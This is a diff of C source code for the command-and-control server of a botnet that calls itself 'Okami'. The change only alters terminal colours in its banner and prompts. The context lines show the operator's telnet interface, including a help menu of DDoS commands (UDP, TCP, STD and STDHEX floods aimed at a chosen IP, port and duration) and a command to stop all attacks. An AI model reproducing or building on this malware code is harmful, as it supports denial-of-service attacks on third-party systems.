@@ -149,7 +149,7 @@ void broadcast(char *msg, int us, char *sender)
                         send(i, ": ", 2, MSG_NOSIGNAL); 
                 }
                 send(i, msg, strlen(msg), MSG_NOSIGNAL);
-                if(sendMGM && managements[i].connected) send(i, "\r\n\e[0;96m[\e[0;97mBotnet@Okami\e[0;96m]\e[0;97m#", 45, MSG_NOSIGNAL);
+                if(sendMGM && managements[i].connected) send(i, "\r\n\e[1;35m[\e[0;97mBotnet@Okami\e[1;35m]\e[0;97m#", 45, MSG_NOSIGNAL);
                 else send(i, "\n", 1, MSG_NOSIGNAL);
         }
         free(wot);
@@ -413,11 +413,11 @@ void *telnetWorker(void *sock) {
 		char ascii_banner_line25 [5000];
 		char ascii_banner_line26 [5000];
 		char line23[80];
-        sprintf(ascii_banner_line20, "                \e[0;96m ██████\e[0;97m╗ \e[0;96m██\e[0;97m╗  \e[0;96m██\e[0;97m╗ \e[0;96m█████\e[0;97m╗ \e[0;96m███\e[0;97m╗   \e[0;96m███\e[0;97m╗\e[0;96m██\e[0;97m╗\r\n");
-		sprintf(ascii_banner_line21, "                \e[0;96m██\e[0;97m╔═══\e[0;96m██\e[0;97m╗\e[0;96m██\e[0;97m║ \e[0;96m██\e[0;97m╔╝\e[0;96m██\e[0;97m╔══\e[0;96m██\e[0;97m╗\e[0;96m████\e[0;97m╗ \e[0;96m████\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
-		sprintf(ascii_banner_line22, "                \e[0;96m██\e[0;97m║   \e[0;96m██\e[0;97m║\e[0;96m█████\e[0;97m╔╝ \e[0;96m███████\e[0;97m║\e[0;96m██\e[0;97m╔\e[0;96m████\e[0;97m╔\e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
-		sprintf(ascii_banner_line23, "                \e[0;96m██\e[0;97m║   \e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m╔═\e[0;96m██\e[0;97m╗ \e[0;96m██\e[0;97m╔══\e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║╚\e[0;96m██\e[0;97m╔╝\e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
-		sprintf(ascii_banner_line24, "                \e[0;97m╚\e[0;96m██████\e[0;97m╔╝\e[0;96m██\e[0;97m║  \e[0;96m██\e[0;97m╗\e[0;96m██\e[0;97m║  \e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║ ╚═╝ \e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
+        sprintf(ascii_banner_line20, "                \e[1;35m ██████\e[0;97m╗ \e[1;35m██\e[0;97m╗  \e[1;35m██\e[0;97m╗ \e[1;35m█████\e[0;97m╗ \e[1;35m███\e[0;97m╗   \e[1;35m███\e[0;97m╗\e[1;35m██\e[0;97m╗\r\n");
+		sprintf(ascii_banner_line21, "                \e[1;35m██\e[0;97m╔═══\e[1;35m██\e[0;97m╗\e[1;35m██\e[0;97m║ \e[1;35m██\e[0;97m╔╝\e[1;35m██\e[0;97m╔══\e[1;35m██\e[0;97m╗\e[1;35m████\e[0;97m╗ \e[1;35m████\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
+		sprintf(ascii_banner_line22, "                \e[1;35m██\e[0;97m║   \e[1;35m██\e[0;97m║\e[1;35m█████\e[0;97m╔╝ \e[1;35m███████\e[0;97m║\e[1;35m██\e[0;97m╔\e[1;35m████\e[0;97m╔\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
+		sprintf(ascii_banner_line23, "                \e[1;35m██\e[0;97m║   \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m╔═\e[1;35m██\e[0;97m╗ \e[1;35m██\e[0;97m╔══\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║╚\e[1;35m██\e[0;97m╔╝\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
+		sprintf(ascii_banner_line24, "                \e[0;97m╚\e[1;35m██████\e[0;97m╔╝\e[1;35m██\e[0;97m║  \e[1;35m██\e[0;97m╗\e[1;35m██\e[0;97m║  \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║ ╚═╝ \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
 		sprintf(ascii_banner_line25, "                \e[0;97m ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝\r\n");
 		sprintf(line23, "\r\n");
         if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
@@ -429,7 +429,7 @@ void *telnetWorker(void *sock) {
 		if(send(thefd, ascii_banner_line25, strlen(ascii_banner_line25), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, line23, strlen(line23), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
-		if(send(thefd, "\e[0;96m[\e[0;97mBotnet@Okami\e[0;96m]\e[0;97m# ", 45, MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, "\e[1;35m[\e[0;97mBotnet@Okami\e[1;35m]\e[0;97m# ", 45, MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
         pthread_create(&title, NULL, &titleWriter, sock);
@@ -450,11 +450,11 @@ if(strstr(buf, "HELP")) {
 				char ddosline4  [80];
 				char ddosline12  [80];
 
-				sprintf(ddosline1, "\e[0;96m !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\r\n");
-				sprintf(ddosline2, "\e[0;96m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
-				sprintf(ddosline3, "\e[0;96m !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\r\n");
-				sprintf(ddosline4, "\e[0;96m !* STDHEX [IP] [PORT] [TIME] | STDHEX FLOOD\r\n");
-				sprintf(ddosline12, "\e[0;96m !* STOP | KILLS ALL ATTACKS\r\n");
+				sprintf(ddosline1, "\e[1;35m !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\r\n");
+				sprintf(ddosline2, "\e[1;35m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
+				sprintf(ddosline3, "\e[1;35m !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\r\n");
+				sprintf(ddosline4, "\e[1;35m !* STDHEX [IP] [PORT] [TIME] | STDHEX FLOOD\r\n");
+				sprintf(ddosline12, "\e[1;35m !* STOP | KILLS ALL ATTACKS\r\n");
 
 				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
@@ -463,7 +463,7 @@ if(strstr(buf, "HELP")) {
 				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
-				if(send(thefd, "\e[0;96m[\e[0;97mBotnet@Okami\e[0;96m]\e[0;97m# ", 44, MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, "\e[1;35m[\e[0;97mBotnet@Okami\e[1;35m]\e[0;97m# ", 44, MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
 				continue;
@@ -534,11 +534,11 @@ if(strstr(buf, "HELP")) {
         if (strstr(buf, "CLEAR"))
         { 
           if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
-        sprintf(ascii_banner_line20, "                \e[0;96m ██████\e[0;97m╗ \e[0;96m██\e[0;97m╗  \e[0;96m██\e[0;97m╗ \e[0;96m█████\e[0;97m╗ \e[0;96m███\e[0;97m╗   \e[0;96m███\e[0;97m╗\e[0;96m██\e[0;97m╗\r\n");
-		sprintf(ascii_banner_line21, "                \e[0;96m██\e[0;97m╔═══\e[0;96m██\e[0;97m╗\e[0;96m██\e[0;97m║ \e[0;96m██\e[0;97m╔╝\e[0;96m██\e[0;97m╔══\e[0;96m██\e[0;97m╗\e[0;96m████\e[0;97m╗ \e[0;96m████\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
-		sprintf(ascii_banner_line22, "                \e[0;96m██\e[0;97m║   \e[0;96m██\e[0;97m║\e[0;96m█████\e[0;97m╔╝ \e[0;96m███████\e[0;97m║\e[0;96m██\e[0;97m╔\e[0;96m████\e[0;97m╔\e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
-		sprintf(ascii_banner_line23, "                \e[0;96m██\e[0;97m║   \e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m╔═\e[0;96m██\e[0;97m╗ \e[0;96m██\e[0;97m╔══\e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║╚\e[0;96m██\e[0;97m╔╝\e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
-		sprintf(ascii_banner_line24, "                \e[0;97m╚\e[0;96m██████\e[0;97m╔╝\e[0;96m██\e[0;97m║  \e[0;96m██\e[0;97m╗\e[0;96m██\e[0;97m║  \e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║ ╚═╝ \e[0;96m██\e[0;97m║\e[0;96m██\e[0;97m║\r\n");
+        sprintf(ascii_banner_line20, "                \e[1;35m ██████\e[0;97m╗ \e[1;35m██\e[0;97m╗  \e[1;35m██\e[0;97m╗ \e[1;35m█████\e[0;97m╗ \e[1;35m███\e[0;97m╗   \e[1;35m███\e[0;97m╗\e[1;35m██\e[0;97m╗\r\n");
+		sprintf(ascii_banner_line21, "                \e[1;35m██\e[0;97m╔═══\e[1;35m██\e[0;97m╗\e[1;35m██\e[0;97m║ \e[1;35m██\e[0;97m╔╝\e[1;35m██\e[0;97m╔══\e[1;35m██\e[0;97m╗\e[1;35m████\e[0;97m╗ \e[1;35m████\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
+		sprintf(ascii_banner_line22, "                \e[1;35m██\e[0;97m║   \e[1;35m██\e[0;97m║\e[1;35m█████\e[0;97m╔╝ \e[1;35m███████\e[0;97m║\e[1;35m██\e[0;97m╔\e[1;35m████\e[0;97m╔\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
+		sprintf(ascii_banner_line23, "                \e[1;35m██\e[0;97m║   \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m╔═\e[1;35m██\e[0;97m╗ \e[1;35m██\e[0;97m╔══\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║╚\e[1;35m██\e[0;97m╔╝\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
+		sprintf(ascii_banner_line24, "                \e[0;97m╚\e[1;35m██████\e[0;97m╔╝\e[1;35m██\e[0;97m║  \e[1;35m██\e[0;97m╗\e[1;35m██\e[0;97m║  \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║ ╚═╝ \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
 		sprintf(ascii_banner_line25, "                \e[0;97m ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝\r\n");
 		sprintf(line23, "\r\n");
         if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
@@ -555,7 +555,7 @@ if(strstr(buf, "HELP")) {
             goto end;
          }
                 trim(buf);
-                sprintf(botnet, "\e[0;96m[\e[0;97mBotnet@Okami\e[0;96m]\e[0;97m# ");
+                sprintf(botnet, "\e[1;35m[\e[0;97mBotnet@Okami\e[1;35m]\e[0;97m# ");
                 if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                 if(strlen(buf) == 0) continue;
                 printf("%s: \"%s\"\n",accounts[find_line].id, buf);
